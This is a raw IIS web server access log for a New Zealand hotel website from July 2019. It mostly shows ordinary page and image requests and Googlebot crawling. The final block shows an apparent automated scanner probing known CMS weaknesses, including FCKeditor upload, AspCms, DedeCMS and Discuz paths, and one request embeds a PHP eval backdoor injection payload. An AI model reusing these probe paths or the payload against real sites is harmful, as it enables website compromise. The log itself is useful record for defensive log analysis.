#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2019-07-19 07:49:59
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2019-07-19 07:49:59 GET / - 34.218.248.81 HTTP/1.1 Go-http-client/1.1 - 200 0 98
2019-07-19 08:09:48 GET /js/bootstrap.min.js - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 13266 347
2019-07-19 08:09:48 GET /js/menu.js - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1168 338
2019-07-19 08:09:49 GET /js/jquery-2.1.1.js - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 97203 346
2019-07-19 08:09:49 GET /img/logo.png - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 22564 365
2019-07-19 08:09:49 GET /js/isotope.pkgd.min.js - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 13789 350
2019-07-19 08:09:49 GET /img/bg.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/css/style.css 200 95902 376
2019-07-19 08:09:51 GET /img/img9.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1089855 365
2019-07-19 08:09:51 GET /img/img6.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1235277 365
2019-07-19 08:09:51 GET /ionicons/fonts/ionicons.ttf - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ionicons/css/ionicons.min.css 200 188773 430
2019-07-19 08:09:53 GET /img/img5.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1134136 365
2019-07-19 08:09:53 GET /img/img10.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1018686 366
2019-07-19 08:09:53 GET /img/img3_1.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1125686 367
2019-07-19 08:09:53 GET /img/img8.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1146016 365
2019-07-19 08:09:54 GET /js/custom.js - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1191 340
2019-07-19 08:09:54 GET /img/img4.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1243133 365
2019-07-19 08:09:55 GET /img/img2.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1266298 365
2019-07-19 08:09:55 GET /img/img3.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1188783 365
2019-07-19 08:09:55 GET /img/img7.jpg - 115.189.89.165 HTTP/1.1 Mozilla/5.0+(Linux;+Android+4.1.1;+M040+Build/JRO03H)+AppleWebKit/535.19+(KHTML,+like+Gecko)+Chrome/57.0.2987.108+Mobile+Safari/537.36 http://www.palacehotel.co.nz/ 200 1155627 365
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2019-07-19 08:28:07
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2019-07-19 08:28:07 GET / - 34.203.234.214 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.169+Safari/537.36 - 200 13738 191
2019-07-19 08:28:07 GET /index.html - 34.203.234.214 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.169+Safari/537.36 - 200 13738 201
2019-07-19 08:28:08 GET /about.html - 34.203.234.214 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.169+Safari/537.36 - 200 5709 201
2019-07-19 08:28:08 GET /services.html - 34.203.234.214 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.169+Safari/537.36 - 200 7369 204
2019-07-19 08:28:10 GET /portfolio.html - 34.203.234.214 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.169+Safari/537.36 - 200 12622 205
2019-07-19 08:28:10 GET /contact.html - 34.203.234.214 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.169+Safari/537.36 - 200 6391 203
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2019-07-19 10:30:11
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2019-07-19 10:30:10 GET / - 35.166.112.99 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/66.0.3359.181+Safari/537.36 - 200 13738 240
2019-07-19 10:40:21 GET / - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 https://www.google.co.nz/ 200 3376 419
2019-07-19 10:40:22 GET /css/style.css - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 5918 361
2019-07-19 10:40:22 GET /js/modernizr.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 19903 348
2019-07-19 10:40:22 GET /ionicons/css/ionicons.min.css - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 10932 377
2019-07-19 10:40:23 GET /js/menu.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1168 343
2019-07-19 10:40:23 GET /js/bootstrap.min.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 13266 352
2019-07-19 10:40:23 GET /css/bootstrap.min.css - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 27806 369
2019-07-19 10:40:23 GET /js/animated-headline.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 2209 356
2019-07-19 10:40:23 GET /js/custom.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1191 345
2019-07-19 10:40:23 GET /js/isotope.pkgd.min.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 13789 355
2019-07-19 10:40:23 GET /js/jquery-2.1.1.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 97203 351
2019-07-19 10:40:23 GET /img/logo.png - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 22564 403
2019-07-19 10:40:24 GET /ionicons/fonts/ionicons.ttf - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 188773 368
2019-07-19 10:40:25 GET /img/img2.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1266298 403
2019-07-19 10:40:25 GET /img/img6.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1235277 403
2019-07-19 10:40:25 GET /img/img3.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1188783 403
2019-07-19 10:40:26 GET /img/img4.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1243133 403
2019-07-19 10:40:26 GET /img/img5.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1134136 403
2019-07-19 10:40:26 GET /img/img3_1.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1125686 405
2019-07-19 10:40:27 GET /img/img8.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1146016 403
2019-07-19 10:40:27 GET /img/img7.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1155627 403
2019-07-19 10:40:27 GET /img/img9.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1089855 403
2019-07-19 10:40:27 GET /img/img10.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 1018686 404
2019-07-19 10:40:28 GET /img/bg.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 95902 401
2019-07-19 10:40:28 GET /favicon.ico - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 404 1405 344
2019-07-19 10:41:13 GET /portfolio.html - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/ 200 2704 437
2019-07-19 10:41:13 GET /css/lightbox.min.css - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 1416 382
2019-07-19 10:41:14 GET /js/lightbox-plus-jquery.min.js - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 41513 377
2019-07-19 10:41:15 GET /img/prev.png - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 1608 417
2019-07-19 10:41:15 GET /img/next.png - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 1598 417
2019-07-19 10:41:15 GET /img/close.png - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 526 418
2019-07-19 10:41:15 GET /img/loading.gif - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 8724 420
2019-07-19 10:41:18 GET /img/01.jpg - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 200 3652210 415
2019-07-19 10:41:19 GET /favicon.ico - 118.148.161.28 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.1.1+Mobile/15E148+Safari/604.1 http://www.palacehotel.co.nz/portfolio.html 404 1405 358
2019-07-19 10:47:17 GET /robots.txt - 66.249.79.49 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 1405 231
2019-07-19 10:47:17 GET / - 66.249.79.52 HTTP/1.1 Mozilla/5.0+(Linux;+Android+6.0.1;+Nexus+5X+Build/MMB29P)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/41.0.2272.96+Mobile+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 200 3376 555
2019-07-19 10:47:20 GET /css/style.css - 66.249.79.49 HTTP/1.1 Mozilla/5.0+(Linux;+Android+6.0.1;+Nexus+5X+Build/MMB29P)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/41.0.2272.96+Mobile+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://palacehotel.co.nz/ 200 5918 448
2019-07-19 10:47:30 GET /js/animated-headline.js - 66.249.79.46 HTTP/1.1 Mozilla/5.0+(Linux;+Android+6.0.1;+Nexus+5X+Build/MMB29P)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/41.0.2272.96+Mobile+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://palacehotel.co.nz/ 200 2209 443
2019-07-19 10:47:32 GET /js/isotope.pkgd.min.js - 66.249.79.49 HTTP/1.1 Mozilla/5.0+(Linux;+Android+6.0.1;+Nexus+5X+Build/MMB29P)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/41.0.2272.96+Mobile+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://palacehotel.co.nz/ 200 13789 442
2019-07-19 10:47:33 GET /js/custom.js - 66.249.79.49 HTTP/1.1 Mozilla/5.0+(Linux;+Android+6.0.1;+Nexus+5X+Build/MMB29P)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/41.0.2272.96+Mobile+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://palacehotel.co.nz/ 200 1191 432
2019-07-19 11:00:20 GET / - 52.53.128.144 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/74.0.3729.131+Safari/537.36 - 200 3395 345
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2019-07-19 11:34:56
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2019-07-19 11:34:55 POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F 404 1405 781
2019-07-19 11:34:56 GET /index.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/index.php?m=member&c=index&a=register&siteid=1 404 1405 281
2019-07-19 11:34:56 POST /admin_aspcms/_system/AspCms_SiteSetting.asp - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/admin_aspcms/_system/AspCms_SiteSetting.asp 404 0 344
2019-07-19 11:34:56 GET /plus/moon.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/plus/moon.php 404 1405 215
2019-07-19 11:34:56 POST /plus/90sec.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/plus/90sec.php 404 1405 521
2019-07-19 11:34:57 POST /utility/convert/index.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/utility/convert/index.php?a=config&source=d7.2_x2.0 404 0 1310
2019-07-19 11:34:57 POST /utility/convert/data/config.inc.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/utility/convert/data/config.inc.php 404 1405 561
2019-07-19 11:34:57 GET /uploads/dede/sys_verifies.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\%22;eval($_POST[ysy]);die();// 404 1405 409
2019-07-19 11:34:57 POST /uploads/dede/sys_verifies.php - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/uploads/dede/sys_verifies.php?action=down 404 0 573
2019-07-19 11:34:58 POST /index.php/api/Uploadify/preview - 104.148.105.2 HTTP/1.1 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2) http://www.palacehotel.co.nz/index.php/api/Uploadify/preview 404 1405 387
